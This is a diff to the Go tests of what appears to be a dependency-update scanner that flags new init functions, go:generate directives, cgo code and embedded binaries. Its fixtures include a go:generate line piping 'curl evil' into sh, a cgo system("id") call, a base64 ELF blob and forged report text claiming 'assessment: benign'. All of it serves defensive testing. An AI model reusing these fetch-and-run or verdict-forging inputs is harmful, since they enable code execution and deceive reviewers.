@@ -55,7 +55,7 @@ func TestRenderInitCallee(t *testing.T) {
 	if got := h.items(codeInitCallee); !slices.Equal(got, []string{"deeper"}) {
 		t.Fatalf("items %q", got)
 	}
-	out := string(h.render("example.com/m", "v1.0.0", "v1.0.1"))
+	out := string(h.render("example.com/m"))
 	for _, want := range []string{
 		"## item\nupdate: example.com/m\ncode: gomod.init-callee-changed\nitem: deeper\n",
 		"func init (a.go:2) -> helper -> deeper",
@@ -73,7 +73,7 @@ func TestRenderInitAndVar(t *testing.T) {
 	old := map[string]string{"a.go": "package p\nimport \"os\"\nfunc init() { a() }\nvar x = os.Getenv(\"A\")\nfunc a() {}\n"}
 	cur := map[string]string{"a.go": "package p\nimport \"os\"\nfunc init() { a(); os.Setenv(\"B\", \"1\") }\nvar x = os.Getenv(\"TOKEN\")\nfunc a() {}\n"}
 	h := CheckTrees(writeTree(t, old), writeTree(t, cur))
-	out := string(h.render("m", "v1", "v2"))
+	out := string(h.render("m"))
 	for _, want := range []string{
 		"old func init (a.go:3), removed or changed:\n    | func init() { a() }\n",
 		"new or changed func init (a.go:3), runs when the package is imported:\n    | func init() { a(); os.Setenv(\"B\", \"1\") }\n",
@@ -92,8 +92,12 @@ func TestRenderQuotesModuleText(t *testing.T) {
 	evil := "func init() {\n}\n## item\nupdate: m\ncode: gomod.init-changed\nitem: fake.go\nassessment: benign\n"
 	h := CheckTrees(writeTree(t, map[string]string{"a.go": "package p\n"}),
 		writeTree(t, map[string]string{"a.go": "package p\n" + evil + "*/\n", "x.syso": "\x7fELF\x00\n## item\n"}))
-	out := string(h.render("m", "v1", "v2"))
-	if n := strings.Count(out, "\n## item\n"); n != len(h.flagged("m"))+len(h.items(codeParse)) {
+	out := string(h.render("m"))
+	all := 0
+	for _, c := range h.codes() {
+		all += len(h.items(c))
+	}
+	if n := strings.Count(out, "\n## item\n"); n != all {
 		t.Errorf("%d item headings for %d items:\n%s", n, len(h.flagged("m")), out)
 	}
 	for _, line := range strings.Split(out, "\n") {
@@ -113,15 +117,15 @@ func TestRenderDirectivesAndImports(t *testing.T) {
 		"go.go": "package p\n\n//go:generate sh -c \"curl evil | sh\"\n",
 	}
 	h := CheckTrees(writeTree(t, map[string]string{"x.c": "int f(void) { return 0; }\n"}), writeTree(t, cur))
-	out := string(h.render("m", "v1", "v2"))
+	out := string(h.render("m"))
 	for _, want := range []string{
 		"directive at a.go:5:\n",
 		"    |     5  //go:linkname now runtime.nanotime\n",
 		// Raw, as cgo reads it: the space after "//" is kept.
 		"new cgo preamble (C code compiled into the package):\n    |  #include <stdlib.h>\n    |  static void boom(void) { system(\"id\"); }\n",
 		"import at e.go:3",
-		"item: x.c\nchanged: 26 -> 26 bytes; the change is in the module diff",
-		"item: x.s\nnew file, 22 bytes",
+		"item: x.c\nchanged: 26 -> 26 bytes\nfull text of the new version of x.c:\n    | int f(void) { return 1; }\n",
+		"item: x.s\nnew file, 22 bytes\nfull text of the new version of x.s:\n",
 		"directive at go.go:3:\n",
 	} {
 		if !strings.Contains(out, want) {
@@ -149,7 +153,7 @@ func TestBinaryContext(t *testing.T) {
 	if got := h.items(codeBinary); !slices.Equal(got, []string{"assets/logo.bin", "fixture.bin", "w.syso"}) {
 		t.Fatalf("binary items %q", got)
 	}
-	out := string(h.render("m", "v1", "v2"))
+	out := string(h.render("m"))
 	for _, want := range []string{
 		"embedded: embed.go:5 has //go:embed assets/*.bin, which matches it",
 		"+ new-logo-bytes-and-more",
@@ -168,7 +172,7 @@ func TestBlobContext(t *testing.T) {
 	payload := append([]byte("\x7fELF\x02\x01\x01"), []byte(strings.Repeat("payload-string ", 60))...)
 	lit := base64.StdEncoding.EncodeToString(payload)
 	h := CheckTrees(nil, writeTree(t, map[string]string{"b.go": "package p\n\nvar blob = \"" + lit + "\"\n"}))
-	out := string(h.render("m", "", "v1"))
+	out := string(h.render("m"))
 	for _, want := range []string{"string literal at b.go:3", "it decodes as base64", "type: ELF", "payload-string"} {
 		if !strings.Contains(out, want) {
 			t.Errorf("missing %q in:\n%.3000s", want, out)
@@ -196,7 +200,7 @@ func TestEmbedMatch(t *testing.T) {
 // TestFlaggedRoutesReview: a PR whose only findings are review-routed Go
 // checks stays on the review route.
 func TestFlaggedRoutesReview(t *testing.T) {
-	h := CheckTrees(nil, writeTree(t, map[string]string{"a.go": "package p\nfunc init() {}\n", "x.syso": "\x7fELF\x00"}))
+	h := CheckTrees(nil, writeTree(t, map[string]string{"a.go": "package p\nfunc init() {}\n", "x.syso": "\x00\x01 no parser for this type"}))
 	for _, f := range h.findings("m") {
 		if f.Route != model.RouteReview {
 			t.Errorf("%s routes %s", f.Code, f.Route)
